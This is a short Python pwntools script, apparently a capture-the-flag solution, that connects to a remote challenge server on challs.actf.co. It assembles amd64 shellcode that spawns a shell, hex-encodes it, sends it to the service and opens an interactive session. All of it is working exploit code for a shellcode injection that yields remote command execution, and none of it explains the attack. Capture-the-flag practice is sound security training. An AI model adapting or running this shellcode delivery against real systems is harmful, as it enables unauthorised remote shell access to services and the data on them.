from pwn import *

# setup architecture
context.arch = 'amd64'

host = 'challs.actf.co'
port = 31200

io = remote(host, port)

shellcode = asm(shellcraft.sh())
shellcode = shellcode.hex()
print(shellcode)

io.sendline(shellcode)

io.interactive()